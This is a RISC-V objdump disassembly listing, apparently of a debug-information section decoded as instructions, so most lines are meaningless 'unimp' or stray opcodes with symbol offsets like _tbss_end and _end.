     14c:	0434                	addi	a3,sp,520
     14e:	0000                	unimp
     150:	01923107          	fld	ft2,25(tp) # ffffffffffff8019 <_end+0xffffffff7ffdcb59>
     154:	0000                	unimp
     156:	0e00                	addi	s0,sp,784
     158:	6b5f 0700 5432      	0x543207006b5f
     15e:	0000                	unimp
     160:	0800                	addi	s0,sp,16
     162:	00047c0b          	0x47c0b
     166:	0700                	addi	s0,sp,896
     168:	5432                	lw	s0,44(sp)
     16a:	0000                	unimp
     16c:	0c00                	addi	s0,sp,528
     16e:	0001b20b          	0x1b20b
     172:	0700                	addi	s0,sp,896
     174:	5432                	lw	s0,44(sp)
     176:	0000                	unimp
     178:	1000                	addi	s0,sp,32
     17a:	0005820b          	0x5820b
     17e:	0700                	addi	s0,sp,896
     180:	5432                	lw	s0,44(sp)
     182:	0000                	unimp
     184:	1400                	addi	s0,sp,544
     186:	5f0e                	lw	t5,224(sp)
     188:	0078                	addi	a4,sp,12
     18a:	01983307          	fld	ft6,25(a6)
     18e:	0000                	unimp
     190:	0018                	0x18
     192:	013f080f          	0x13f080f
     196:	0000                	unimp
     198:	3408                	fld	fa0,40(s0)
     19a:	0001                	nop
     19c:	a800                	fsd	fs0,16(s0)
     19e:	0001                	nop
     1a0:	0900                	addi	s0,sp,144
     1a2:	007f                	0x7f
     1a4:	0000                	unimp
     1a6:	0000                	unimp
     1a8:	f60d                	bnez	a2,d2 <_tbss_end+0x4e>
     1aa:	0001                	nop
     1ac:	2400                	fld	fs0,8(s0)
     1ae:	02213707          	fld	fa4,34(sp)
     1b2:	0000                	unimp
     1b4:	0000d60b          	0xd60b
     1b8:	0700                	addi	s0,sp,896
     1ba:	5439                	li	s0,-18
     1bc:	0000                	unimp
     1be:	0000                	unimp
     1c0:	0004e80b          	0x4e80b
     1c4:	0700                	addi	s0,sp,896
     1c6:	543a                	lw	s0,172(sp)
     1c8:	0000                	unimp
     1ca:	0400                	addi	s0,sp,512
     1cc:	0001090b          	0x1090b
     1d0:	0700                	addi	s0,sp,896
     1d2:	0000543b          	srlw	s0,zero,zero
     1d6:	0800                	addi	s0,sp,16
     1d8:	0006180b          	0x6180b
     1dc:	0700                	addi	s0,sp,896
     1de:	543c                	lw	a5,104(s0)
     1e0:	0000                	unimp
     1e2:	0c00                	addi	s0,sp,528
     1e4:	0003610b          	0x3610b
     1e8:	0700                	addi	s0,sp,896
     1ea:	543d                	li	s0,-17
     1ec:	0000                	unimp
     1ee:	1000                	addi	s0,sp,32
     1f0:	0004de0b          	0x4de0b
     1f4:	0700                	addi	s0,sp,896
     1f6:	543e                	lw	s0,236(sp)
     1f8:	0000                	unimp
     1fa:	1400                	addi	s0,sp,544
     1fc:	0005870b          	0x5870b
     200:	0700                	addi	s0,sp,896
     202:	0000543f f50b1800 	0xf50b18000000543f
     20a:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     20e:	5440                	lw	s0,44(s0)
     210:	0000                	unimp
     212:	1c00                	addi	s0,sp,560
     214:	0005c20b          	0x5c20b
     218:	0700                	addi	s0,sp,896
     21a:	5441                	li	s0,-16
     21c:	0000                	unimp
     21e:	2000                	fld	fs0,0(s0)
     220:	1000                	addi	s0,sp,32
     222:	0118                	addi	a4,sp,128
     224:	0000                	unimp
     226:	0208                	addi	a0,sp,256
     228:	02624a07          	flq	fs4,38(tp) # 26 <_tdata_begin+0x26>
     22c:	0000                	unimp
     22e:	0001a50b          	0x1a50b
     232:	0700                	addi	s0,sp,896
     234:	0002624b          	fnmsub.s	ft4,ft4,ft0,ft0,unknown
     238:	0000                	unimp
     23a:	0011                	c.nop	4
     23c:	0000                	unimp
     23e:	0700                	addi	s0,sp,896
     240:	624c                	ld	a1,128(a2)
     242:	0002                	c.slli	zero,0x0
     244:	0000                	unimp
     246:	1101                	addi	sp,sp,-32
     248:	0502                	slli	a0,a0,0x0
     24a:	0000                	unimp
     24c:	01344e07          	flq	ft8,19(s0)
     250:	0000                	unimp
     252:	0200                	addi	s0,sp,256
     254:	4711                	li	a4,4
     256:	0001                	nop
     258:	0700                	addi	s0,sp,896
     25a:	3451                	addiw	s0,s0,-12
     25c:	0001                	nop
     25e:	0400                	addi	s0,sp,512
     260:	0002                	c.slli	zero,0x0
     262:	3208                	fld	fa0,32(a2)
     264:	0001                	nop
     266:	7200                	ld	s0,32(a2)
     268:	0002                	c.slli	zero,0x0
     26a:	0900                	addi	s0,sp,144
     26c:	007f                	0x7f
     26e:	0000                	unimp
     270:	001f 6a10 0003      	0x36a10001f
     276:	1800                	addi	s0,sp,48
     278:	b15d0703          	lb	a4,-1259(s10) # 18b15 <_tbss_end+0x18a91>
     27c:	0002                	c.slli	zero,0x0
     27e:	0b00                	addi	s0,sp,400
     280:	0434                	addi	a3,sp,520
     282:	0000                	unimp
     284:	02b15e07          	0x2b15e07
     288:	0000                	unimp
     28a:	0b00                	addi	s0,sp,400
     28c:	044c                	addi	a1,sp,516
     28e:	0000                	unimp
     290:	00545f07          	0x545f07
     294:	0000                	unimp
     296:	0b08                	addi	a0,sp,400
     298:	01ad                	addi	gp,gp,11
     29a:	0000                	unimp
     29c:	02b76107          	0x2b76107
     2a0:	0000                	unimp
     2a2:	1110                	addi	a2,sp,160
     2a4:	0118                	addi	a4,sp,128
     2a6:	0000                	unimp
     2a8:	02216207          	0x2216207
     2ac:	0000                	unimp
     2ae:	0110                	addi	a2,sp,128
     2b0:	0f00                	addi	s0,sp,912
     2b2:	7208                	ld	a0,32(a2)
     2b4:	0002                	c.slli	zero,0x0
     2b6:	0800                	addi	s0,sp,16
     2b8:	000002c7          	fmsub.s	ft5,ft0,ft0,ft0,rne
     2bc:	000002c7          	fmsub.s	ft5,ft0,ft0,ft0,rne
     2c0:	7f09                	lui	t5,0xfffe2
     2c2:	0000                	unimp
     2c4:	1f00                	addi	s0,sp,944
     2c6:	0f00                	addi	s0,sp,912
     2c8:	cd08                	sw	a0,24(a0)
     2ca:	0002                	c.slli	zero,0x0
     2cc:	1200                	addi	s0,sp,288
     2ce:	ff0d                	bnez	a4,208 <_tbss_end+0x184>
     2d0:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
     2d4:	02f37507          	0x2f37507
     2d8:	0000                	unimp
     2da:	0000fd0b          	0xfd0b
     2de:	0700                	addi	s0,sp,896
     2e0:	f376                	sd	t4,416(sp)
     2e2:	0002                	c.slli	zero,0x0
     2e4:	0000                	unimp
     2e6:	0006b30b          	0x6b30b
     2ea:	0700                	addi	s0,sp,896
     2ec:	00005477          	0x5477
     2f0:	0800                	addi	s0,sp,16
     2f2:	0f00                	addi	s0,sp,912
     2f4:	3f08                	fld	fa0,56(a4)
     2f6:	0000                	unimp
     2f8:	0d00                	addi	s0,sp,656
     2fa:	041e                	slli	s0,s0,0x7
     2fc:	0000                	unimp
     2fe:	07b0                	addi	a2,sp,968
     300:	23b5                	addiw	t2,t2,13
     302:	0004                	0x4
     304:	0e00                	addi	s0,sp,784
     306:	705f 0700 f3b6      	0xf3b60700705f
     30c:	0002                	c.slli	zero,0x0
     30e:	0000                	unimp
     310:	5f0e                	lw	t5,224(sp)
     312:	0072                	c.slli	zero,0x1c
     314:	0054b707          	fld	fa4,5(s1)
     318:	0000                	unimp
     31a:	0e08                	addi	a0,sp,784
     31c:	775f 0700 54b8      	0x54b80700775f
     322:	0000                	unimp
     324:	0c00                	addi	s0,sp,528
     326:	0001400b          	0x1400b
     32a:	0700                	addi	s0,sp,896
     32c:	46b9                	li	a3,14
     32e:	0000                	unimp
     330:	1000                	addi	s0,sp,32
     332:	0002260b          	0x2260b
     336:	0700                	addi	s0,sp,896
     338:	46ba                	lw	a3,140(sp)
     33a:	0000                	unimp
     33c:	1200                	addi	s0,sp,288
     33e:	5f0e                	lw	t5,224(sp)
     340:	6662                	ld	a2,24(sp)
     342:	0700                	addi	s0,sp,896
     344:	0002cebb          	0x2cebb
     348:	1800                	addi	s0,sp,48
     34a:	0000850b          	0x850b
     34e:	0700                	addi	s0,sp,896
     350:	54bc                	lw	a5,104(s1)
     352:	0000                	unimp
     354:	2800                	fld	fs0,16(s0)
     356:	0001300b          	0x1300b
     35a:	0700                	addi	s0,sp,896
     35c:	000132c3          	fmadd.s	ft5,ft2,ft0,ft0,rup
     360:	3000                	fld	fs0,32(s0)
     362:	0001e60b          	0x1e60b
     366:	0700                	addi	s0,sp,896
     368:	90c5                	srli	s1,s1,0x31
     36a:	0005                	c.nop	1
     36c:	3800                	fld	fs0,48(s0)
     36e:	0002aa0b          	0x2aa0b
     372:	0700                	addi	s0,sp,896
     374:	0005bac7          	fmsub.s	fs5,fa1,ft0,ft0,rup
     378:	4000                	lw	s0,0(s0)
     37a:	0004a10b          	0x4a10b
     37e:	0700                	addi	s0,sp,896
     380:	deca                	sw	s2,124(sp)
     382:	0005                	c.nop	1
     384:	4800                	lw	s0,16(s0)
     386:	0005dc0b          	0x5dc0b
     38a:	0700                	addi	s0,sp,896
     38c:	0005f8cb          	fnmsub.s	fa7,fa1,ft0,ft0
     390:	5000                	lw	s0,32(s0)
     392:	5f0e                	lw	t5,224(sp)
     394:	6275                	lui	tp,0x1d
     396:	0700                	addi	s0,sp,896
     398:	cece                	sw	s3,92(sp)
     39a:	0002                	c.slli	zero,0x0
     39c:	5800                	lw	s0,48(s0)
     39e:	5f0e                	lw	t5,224(sp)
     3a0:	7075                	c.lui	zero,0xffffd
     3a2:	0700                	addi	s0,sp,896
     3a4:	0002f3cf          	fnmadd.s	ft7,ft5,ft0,ft0
     3a8:	6800                	ld	s0,16(s0)
     3aa:	5f0e                	lw	t5,224(sp)
     3ac:	7275                	lui	tp,0xffffd
     3ae:	0700                	addi	s0,sp,896
     3b0:	54d0                	lw	a2,44(s1)
     3b2:	0000                	unimp
     3b4:	7000                	ld	s0,32(s0)
     3b6:	0000f70b          	0xf70b
     3ba:	0700                	addi	s0,sp,896
     3bc:	0005fed3          	fadd.s	ft9,fa1,ft0
     3c0:	7400                	ld	s0,40(s0)
     3c2:	0005b40b          	0x5b40b
     3c6:	0700                	addi	s0,sp,896
     3c8:	0ed4                	addi	a3,sp,852
     3ca:	0006                	c.slli	zero,0x1
     3cc:	7700                	ld	s0,40(a4)
     3ce:	5f0e                	lw	t5,224(sp)
     3d0:	626c                	ld	a1,192(a2)
     3d2:	0700                	addi	s0,sp,896
     3d4:	0002ced7          	0x2ced7
     3d8:	7800                	ld	s0,48(s0)
     3da:	0001620b          	0x1620b
     3de:	0700                	addi	s0,sp,896
     3e0:	54da                	lw	s1,180(sp)
     3e2:	0000                	unimp
     3e4:	8800                	0x8800
     3e6:	0001730b          	0x1730b
     3ea:	0700                	addi	s0,sp,896
     3ec:	00009fdb          	0x9fdb
     3f0:	9000                	0x9000
     3f2:	0006760b          	0x6760b
     3f6:	0700                	addi	s0,sp,896
     3f8:	41de                	lw	gp,212(sp)
     3fa:	0004                	0x4
     3fc:	9800                	0x9800
     3fe:	0002910b          	0x2910b
     402:	0700                	addi	s0,sp,896
     404:	27e2                	fld	fa5,24(sp)
     406:	0001                	nop
     408:	a000                	fsd	fs0,0(s0)
     40a:	0004260b          	0x4260b
     40e:	0700                	addi	s0,sp,896
     410:	1ce4                	addi	s1,sp,636
     412:	0001                	nop
     414:	a400                	fsd	fs0,8(s0)
     416:	0002970b          	0x2970b
     41a:	0700                	addi	s0,sp,896
     41c:	54e5                	li	s1,-7
     41e:	0000                	unimp
     420:	ac00                	fsd	fs0,24(s0)
     422:	1300                	addi	s0,sp,416
     424:	00b5                	addi	ra,ra,13
     426:	0000                	unimp
     428:	0441                	addi	s0,s0,16
     42a:	0000                	unimp
     42c:	4114                	lw	a3,0(a0)
     42e:	0004                	0x4
     430:	1400                	addi	s0,sp,544
     432:	0132                	slli	sp,sp,0xc
     434:	0000                	unimp
     436:	7e14                	ld	a3,56(a2)
     438:	0005                	c.nop	1
     43a:	1400                	addi	s0,sp,544
     43c:	0054                	addi	a3,sp,4
     43e:	0000                	unimp
     440:	0f00                	addi	s0,sp,912
     442:	4c08                	lw	a0,24(s0)
     444:	0004                	0x4
     446:	1500                	addi	s0,sp,672
     448:	0441                	addi	s0,s0,16
     44a:	0000                	unimp
     44c:	8416                	mv	s0,t0
     44e:	0004                	0x4
     450:	4800                	lw	s0,16(s0)
     452:	02390707          	0x2390707
     456:	057e                	slli	a0,a0,0x1f
     458:	0000                	unimp
     45a:	0003e417          	auipc	s0,0x3e
     45e:	0700                	addi	s0,sp,896
     460:	0054023b          	addw	tp,s0,t0
     464:	0000                	unimp
     466:	1700                	addi	s0,sp,928
     468:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
     46c:	65024007          	flq	ft0,1616(tp) # ffffffffffffd650 <_end+0xffffffff7ffe2190>
     470:	0006                	c.slli	zero,0x1
     472:	0800                	addi	s0,sp,16
     474:	00020e17          	auipc	t3,0x20
     478:	0700                	addi	s0,sp,896
     47a:	0240                	addi	s0,sp,260
     47c:	0665                	addi	a2,a2,25
     47e:	0000                	unimp
     480:	1710                	addi	a2,sp,928
     482:	000001c7          	fmsub.s	ft3,ft0,ft0,ft0,rne
     486:	65024007          	flq	ft0,1616(tp) # 650 <_tbss_end+0x5cc>
     48a:	0006                	c.slli	zero,0x1
     48c:	1800                	addi	s0,sp,48
     48e:	00044717          	auipc	a4,0x44
     492:	0700                	addi	s0,sp,896
     494:	0242                	slli	tp,tp,0x10
     496:	0054                	addi	a3,sp,4
     498:	0000                	unimp
     49a:	1720                	addi	s0,sp,936
     49c:	0025                	c.nop	9
     49e:	0000                	unimp
     4a0:	50024307          	flq	ft6,1280(tp) # 500 <_tbss_end+0x47c>
     4a4:	0008                	0x8
     4a6:	2400                	fld	fs0,8(s0)
     4a8:	00046317          	auipc	t1,0x46
     4ac:	0700                	addi	s0,sp,896
     4ae:	0246                	slli	tp,tp,0x11
     4b0:	0054                	addi	a3,sp,4
     4b2:	0000                	unimp
     4b4:	1740                	addi	s0,sp,932
     4b6:	0451                	addi	s0,s0,20
     4b8:	0000                	unimp
     4ba:	65024707          	flq	fa4,1616(tp) # 650 <_tbss_end+0x5cc>
     4be:	0008                	0x8
     4c0:	4800                	lw	s0,16(s0)
     4c2:	00037217          	auipc	tp,0x37
     4c6:	0700                	addi	s0,sp,896
     4c8:	0249                	addi	tp,tp,18
     4ca:	0054                	addi	a3,sp,4
     4cc:	0000                	unimp
     4ce:	1750                	addi	a2,sp,932
     4d0:	0459                	addi	s0,s0,22
     4d2:	0000                	unimp
     4d4:	76024b07          	flq	fs6,1888(tp) # 37c22 <_tbss_end+0x37b9e>
     4d8:	0008                	0x8
     4da:	5800                	lw	s0,48(s0)
     4dc:	00027c17          	auipc	s8,0x27
     4e0:	0700                	addi	s0,sp,896
     4e2:	024e                	slli	tp,tp,0x13
     4e4:	0192                	slli	gp,gp,0x4
     4e6:	0000                	unimp
     4e8:	1760                	addi	s0,sp,940
     4ea:	01ec                	addi	a1,sp,204
     4ec:	0000                	unimp
     4ee:	54024f07          	flq	ft10,1344(tp) # 540 <_tbss_end+0x4bc>
     4f2:	0000                	unimp
     4f4:	6800                	ld	s0,16(s0)
     4f6:	00060417          	auipc	s0,0x60
     4fa:	0700                	addi	s0,sp,896
     4fc:	0250                	addi	a2,sp,260
     4fe:	0192                	slli	gp,gp,0x4
     500:	0000                	unimp
     502:	1770                	addi	a2,sp,940
     504:	039d                	addi	t2,t2,7
     506:	0000                	unimp
     508:	7c025107          	0x7c025107
     50c:	0008                	0x8
     50e:	7800                	ld	s0,48(s0)
     510:	00021617          	auipc	a2,0x21
     514:	0700                	addi	s0,sp,896
     516:	0254                	addi	a3,sp,260
     518:	0054                	addi	a3,sp,4
     51a:	0000                	unimp
     51c:	1780                	addi	s0,sp,992
     51e:	0000016b          	0x16b
     522:	7e025507          	0x7e025507
     526:	0005                	c.nop	1
     528:	8800                	0x8800
     52a:	0003dd17          	auipc	s10,0x3d
     52e:	0700                	addi	s0,sp,896
     530:	0278                	addi	a4,sp,268
     532:	082d                	addi	a6,a6,11
     534:	0000                	unimp
     536:	1890                	addi	a2,sp,112
     538:	036a                	slli	t1,t1,0x1a
     53a:	0000                	unimp
     53c:	b1027c07          	0xb1027c07
     540:	0002                	c.slli	zero,0x0
     542:	f800                	sd	s0,48(s0)
     544:	1801                	addi	a6,a6,-32
     546:	0000024f          	fnmadd.s	ft4,ft0,ft0,ft0,rne
     54a:	72027d07          	0x72027d07
     54e:	0002                	c.slli	zero,0x0
     550:	0000                	unimp
     552:	1802                	slli	a6,a6,0x20
     554:	05aa                	slli	a1,a1,0xa
     556:	0000                	unimp
     558:	8d028107          	0x8d028107
     55c:	0008                	0x8
     55e:	1800                	addi	s0,sp,48
     560:	1805                	addi	a6,a6,-31
     562:	0138                	addi	a4,sp,136
     564:	0000                	unimp
     566:	2a028607          	0x2a028607
     56a:	0006                	c.slli	zero,0x1
     56c:	2000                	fld	fs0,0(s0)
     56e:	1805                	addi	a6,a6,-31
     570:	00000113          	li	sp,0
     574:	99028707          	0x99028707
     578:	0008                	0x8
     57a:	3800                	fld	fs0,48(s0)
     57c:	0005                	c.nop	1
     57e:	0584080f          	0x584080f
     582:	0000                	unimp
     584:	0102                	slli	sp,sp,0x0
     586:	cf08                	sw	a0,24(a4)
     588:	15000003          	lb	zero,336(zero) # ffffffffffffd150 <_end+0xffffffff7ffe1c90>
     58c:	0584                	addi	s1,sp,704
     58e:	0000                	unimp
     590:	0423080f          	0x423080f
     594:	0000                	unimp
     596:	0000b513          	sltiu	a0,ra,0
     59a:	b400                	fsd	fs0,40(s0)
     59c:	0005                	c.nop	1
     59e:	1400                	addi	s0,sp,544
     5a0:	0441                	addi	s0,s0,16
     5a2:	0000                	unimp
     5a4:	3214                	fld	fa3,32(a2)
     5a6:	0001                	nop
     5a8:	1400                	addi	s0,sp,544
     5aa:	05b4                	addi	a3,sp,712
     5ac:	0000                	unimp
     5ae:	5414                	lw	a3,40(s0)
     5b0:	0000                	unimp
     5b2:	0000                	unimp
     5b4:	058b080f          	0x58b080f
     5b8:	0000                	unimp
     5ba:	0596080f          	0x596080f
     5be:	0000                	unimp
     5c0:	0000aa13          	slti	s4,ra,0
     5c4:	de00                	sw	s0,56(a2)
     5c6:	0005                	c.nop	1
     5c8:	1400                	addi	s0,sp,544
     5ca:	0441                	addi	s0,s0,16
     5cc:	0000                	unimp
     5ce:	3214                	fld	fa3,32(a2)
     5d0:	0001                	nop
     5d2:	1400                	addi	s0,sp,544
     5d4:	00aa                	slli	ra,ra,0xa
     5d6:	0000                	unimp
     5d8:	5414                	lw	a3,40(s0)
     5da:	0000                	unimp
     5dc:	0000                	unimp
     5de:	05c0080f          	0x5c0080f
     5e2:	0000                	unimp
     5e4:	00005413          	srli	s0,zero,0x0
     5e8:	f800                	sd	s0,48(s0)
     5ea:	0005                	c.nop	1
     5ec:	1400                	addi	s0,sp,544
     5ee:	0441                	addi	s0,s0,16
     5f0:	0000                	unimp
     5f2:	3214                	fld	fa3,32(a2)
     5f4:	0001                	nop
     5f6:	0000                	unimp
     5f8:	05e4080f          	0x5e4080f
     5fc:	0000                	unimp
     5fe:	3f08                	fld	fa0,56(a4)
     600:	0000                	unimp
     602:	0e00                	addi	s0,sp,784
     604:	0006                	c.slli	zero,0x1
     606:	0900                	addi	s0,sp,144
     608:	007f                	0x7f
     60a:	0000                	unimp
     60c:	0002                	c.slli	zero,0x0
     60e:	3f08                	fld	fa0,56(a4)
     610:	0000                	unimp
     612:	1e00                	addi	s0,sp,816
     614:	0006                	c.slli	zero,0x1
     616:	0900                	addi	s0,sp,144
     618:	007f                	0x7f
     61a:	0000                	unimp
     61c:	0000                	unimp
     61e:	0c05                	addi	s8,s8,1
     620:	0004                	0x4
     622:	0700                	addi	s0,sp,896
     624:	011f 02f9 0000      	0x2f9011f
     62a:	9119                	srli	a0,a0,0x26
     62c:	0005                	c.nop	1
     62e:	1800                	addi	s0,sp,48
     630:	5f012307          	flw	ft6,1520(sp)
     634:	0006                	c.slli	zero,0x1
     636:	1700                	addi	s0,sp,928
     638:	0434                	addi	a3,sp,520
     63a:	0000                	unimp
     63c:	5f012507          	flw	fa0,1520(sp)
     640:	0006                	c.slli	zero,0x1
     642:	0000                	unimp
     644:	00022c17          	auipc	s8,0x22
     648:	0700                	addi	s0,sp,896
     64a:	0126                	slli	sp,sp,0x9
     64c:	0054                	addi	a3,sp,4
     64e:	0000                	unimp
     650:	1708                	addi	a0,sp,928
     652:	0406                	slli	s0,s0,0x1
     654:	0000                	unimp
     656:	65012707          	flw	fa4,1616(sp)
     65a:	0006                	c.slli	zero,0x1
     65c:	1000                	addi	s0,sp,32
     65e:	0f00                	addi	s0,sp,912
     660:	2a08                	fld	fa0,16(a2)
     662:	0006                	c.slli	zero,0x1
     664:	0f00                	addi	s0,sp,912
     666:	1e08                	addi	a0,sp,816
     668:	0006                	c.slli	zero,0x1
     66a:	1900                	addi	s0,sp,176
     66c:	001d                	c.nop	7
     66e:	0000                	unimp
     670:	070e                	slli	a4,a4,0x3
     672:	06a0013f 8b170000 	0x8b17000006a0013f
     67a:	0004                	0x4
     67c:	0700                	addi	s0,sp,896
     67e:	0140                	addi	s0,sp,132
     680:	06a0                	addi	s0,sp,840
     682:	0000                	unimp
     684:	1700                	addi	s0,sp,928
     686:	0000050b          	0x50b
     68a:	a0014107          	flq	ft2,-1536(sp)
     68e:	0006                	c.slli	zero,0x1
     690:	0600                	addi	s0,sp,768
     692:	00053417          	auipc	s0,0x53
     696:	0700                	addi	s0,sp,896
     698:	0142                	slli	sp,sp,0x10
     69a:	004d                	c.nop	19
     69c:	0000                	unimp
     69e:	000c                	0xc
     6a0:	4d08                	lw	a0,24(a0)
     6a2:	0000                	unimp
     6a4:	b000                	fsd	fs0,32(s0)
     6a6:	0006                	c.slli	zero,0x1
     6a8:	0900                	addi	s0,sp,144
     6aa:	007f                	0x7f
     6ac:	0000                	unimp
     6ae:	0002                	c.slli	zero,0x0
     6b0:	d81a                	sw	t1,48(sp)
     6b2:	b1025907          	0xb1025907
     6b6:	17000007          	0x17000007
     6ba:	0575                	addi	a0,a0,29
     6bc:	0000                	unimp
     6be:	5b025b07          	0x5b025b07
     6c2:	0000                	unimp
     6c4:	0000                	unimp
     6c6:	00051117          	auipc	sp,0x51
     6ca:	0700                	addi	s0,sp,896
     6cc:	025c                	addi	a5,sp,260
     6ce:	057e                	slli	a0,a0,0x1f
     6d0:	0000                	unimp
     6d2:	1708                	addi	a0,sp,928
     6d4:	0000026f          	jal	tp,6d4 <_tbss_end+0x650>
     6d8:	b1025d07          	0xb1025d07
     6dc:	10000007          	0x10000007
     6e0:	0005cd17          	auipc	s10,0x5c
     6e4:	0700                	addi	s0,sp,896
     6e6:	025e                	slli	tp,tp,0x17
     6e8:	01a8                	addi	a0,sp,200
     6ea:	0000                	unimp
     6ec:	172c                	addi	a1,sp,936
     6ee:	000001d7          	0x1d7
     6f2:	54025f07          	0x54025f07
     6f6:	0000                	unimp
     6f8:	5000                	lw	s0,32(s0)
     6fa:	00042f17          	auipc	t5,0x42
     6fe:	0700                	addi	s0,sp,896
     700:	0260                	addi	s0,sp,268
     702:	07c1                	addi	a5,a5,16
     704:	0000                	unimp
     706:	1758                	addi	a4,sp,932
     708:	000005e3          	beqz	zero,f12 <_tbss_end+0xe8e>
     70c:	6b026107          	0x6b026107
     710:	0006                	c.slli	zero,0x1
     712:	6000                	ld	s0,0(s0)
     714:	00043a17          	auipc	s4,0x43
     718:	0700                	addi	s0,sp,896
     71a:	0262                	slli	tp,tp,0x18
     71c:	011c                	addi	a5,sp,128
     71e:	0000                	unimp
     720:	1770                	addi	a2,sp,940
     722:	05ee                	slli	a1,a1,0x1b
     724:	0000                	unimp
     726:	1c026307          	0x1c026307
     72a:	0001                	nop
     72c:	7800                	ld	s0,48(s0)
     72e:	0000c817          	auipc	a6,0xc
     732:	0700                	addi	s0,sp,896
     734:	0264                	addi	s1,sp,268
     736:	011c                	addi	a5,sp,128
     738:	0000                	unimp
     73a:	1780                	addi	s0,sp,992
     73c:	05a0                	addi	s0,sp,712
     73e:	0000                	unimp
     740:	c8026507          	0xc8026507
     744:	88000007          	0x88000007
     748:	00026317          	auipc	t1,0x26
     74c:	0700                	addi	s0,sp,896
     74e:	0266                	slli	tp,tp,0x19
     750:	07d8                	addi	a4,sp,964
     752:	0000                	unimp
     754:	1790                	addi	a2,sp,992
     756:	054a                	slli	a0,a0,0x12
     758:	0000                	unimp
     75a:	54026707          	0x54026707
     75e:	0000                	unimp
     760:	a800                	fsd	fs0,16(s0)
     762:	00018c17          	auipc	s8,0x18
     766:	0700                	addi	s0,sp,896
     768:	0268                	addi	a0,sp,268
     76a:	011c                	addi	a5,sp,128
     76c:	0000                	unimp
     76e:	17ac                	addi	a1,sp,1000
     770:	00b1                	addi	ra,ra,12
     772:	0000                	unimp
     774:	1c026907          	0x1c026907
     778:	0001                	nop
     77a:	b400                	fsd	fs0,40(s0)
     77c:	00017b17          	auipc	s6,0x17
     780:	0700                	addi	s0,sp,896
     782:	026a                	slli	tp,tp,0x1a
     784:	011c                	addi	a5,sp,128
     786:	0000                	unimp
     788:	17bc                	addi	a5,sp,1000
     78a:	004e                	c.slli	zero,0x13
     78c:	0000                	unimp
     78e:	1c026b07          	0x1c026b07
     792:	0001                	nop
     794:	c400                	sw	s0,8(s0)
     796:	00005d17          	auipc	s10,0x5
     79a:	0700                	addi	s0,sp,896
     79c:	026c                	addi	a1,sp,268
     79e:	011c                	addi	a5,sp,128
     7a0:	0000                	unimp
     7a2:	17cc                	addi	a1,sp,996
     7a4:	03e2                	slli	t2,t2,0x18
     7a6:	0000                	unimp
     7a8:	54026d07          	0x54026d07
     7ac:	0000                	unimp
     7ae:	d400                	sw	s0,40(s0)
     7b0:	0800                	addi	s0,sp,16
     7b2:	0584                	addi	s1,sp,704
     7b4:	0000                	unimp
     7b6:	07c1                	addi	a5,a5,16
     7b8:	0000                	unimp
     7ba:	7f09                	lui	t5,0xfffe2
     7bc:	0000                	unimp
     7be:	1900                	addi	s0,sp,176
     7c0:	0200                	addi	s0,sp,256
     7c2:	0708                	addi	a0,sp,896
     7c4:	006e                	c.slli	zero,0x1b
     7c6:	0000                	unimp
     7c8:	8408                	0x8408
     7ca:	0005                	c.nop	1
     7cc:	d800                	sw	s0,48(s0)
     7ce:	09000007          	0x9000007
     7d2:	007f                	0x7f
     7d4:	0000                	unimp
     7d6:	84080007          	0x84080007
     7da:	0005                	c.nop	1
     7dc:	e800                	sd	s0,16(s0)
     7de:	09000007          	0x9000007
     7e2:	007f                	0x7f
     7e4:	0000                	unimp
     7e6:	681b0017          	auipc	zero,0x681b0
     7ea:	0701                	addi	a4,a4,0
     7ec:	0272                	slli	tp,tp,0x1c
     7ee:	080d                	addi	a6,a6,3
     7f0:	0000                	unimp
     7f2:	00034d17          	auipc	s10,0x34
     7f6:	0700                	addi	s0,sp,896
     7f8:	0275                	addi	tp,tp,29
     7fa:	080d                	addi	a6,a6,3
     7fc:	0000                	unimp
     7fe:	1700                	addi	s0,sp,928
     800:	00000323          	sb	zero,6(zero) # 681b07ec <_tbss_end+0x681b0768>
     804:	1d027607          	0x1d027607
     808:	0008                	0x8
     80a:	f000                	sd	s0,32(s0)
     80c:	0800                	addi	s0,sp,16
     80e:	000002f3          	0x2f3
     812:	081d                	addi	a6,a6,7
     814:	0000                	unimp
     816:	7f09                	lui	t5,0xfffe2
     818:	0000                	unimp
     81a:	1d00                	addi	s0,sp,688
     81c:	0800                	addi	s0,sp,16
     81e:	0000005b          	0x5b
     822:	082d                	addi	a6,a6,11
     824:	0000                	unimp
     826:	7f09                	lui	t5,0xfffe2
     828:	0000                	unimp
     82a:	1d00                	addi	s0,sp,688
     82c:	1c00                	addi	s0,sp,560
     82e:	0168                	addi	a0,sp,140
     830:	50025707          	0x50025707
     834:	0008                	0x8
     836:	1d00                	addi	s0,sp,688
     838:	0484                	addi	s1,sp,576
     83a:	0000                	unimp
     83c:	b0026e07          	0xb0026e07
     840:	0006                	c.slli	zero,0x1
     842:	1d00                	addi	s0,sp,688
     844:	05ba                	slli	a1,a1,0xe
     846:	0000                	unimp
     848:	e8027707          	0xe8027707
     84c:	00000007          	0x7
     850:	8408                	0x8408
     852:	0005                	c.nop	1
     854:	6000                	ld	s0,0(s0)
     856:	0008                	0x8
     858:	0900                	addi	s0,sp,144
     85a:	007f                	0x7f
     85c:	0000                	unimp
     85e:	0018                	0x18
     860:	9d1e                	add	s10,s10,t2
     862:	0000                	unimp
     864:	0f00                	addi	s0,sp,912
     866:	6008                	ld	a0,0(s0)
     868:	0008                	0x8
     86a:	1f00                	addi	s0,sp,944
     86c:	0876                	slli	a6,a6,0x1d
     86e:	0000                	unimp
     870:	4114                	lw	a3,0(a0)
     872:	0004                	0x4
     874:	0000                	unimp
     876:	086b080f          	0x86b080f
     87a:	0000                	unimp
     87c:	0192080f          	0x192080f
     880:	0000                	unimp
     882:	8d1f 0008 1400      	0x140000088d1f
     888:	0054                	addi	a3,sp,4
     88a:	0000                	unimp
     88c:	0f00                	addi	s0,sp,912
     88e:	9308                	0x9308
     890:	0008                	0x8
     892:	0f00                	addi	s0,sp,912
     894:	8208                	0x8208
     896:	0008                	0x8
     898:	0800                	addi	s0,sp,16
     89a:	061e                	slli	a2,a2,0x7
     89c:	0000                	unimp
     89e:	08a9                	addi	a7,a7,10
     8a0:	0000                	unimp
     8a2:	7f09                	lui	t5,0xfffe2
     8a4:	0000                	unimp
     8a6:	0200                	addi	s0,sp,256
     8a8:	2000                	fld	fs0,0(s0)
     8aa:	055e                	slli	a0,a0,0x17
     8ac:	0000                	unimp
     8ae:	4102fe07          	0x4102fe07
     8b2:	0004                	0x4
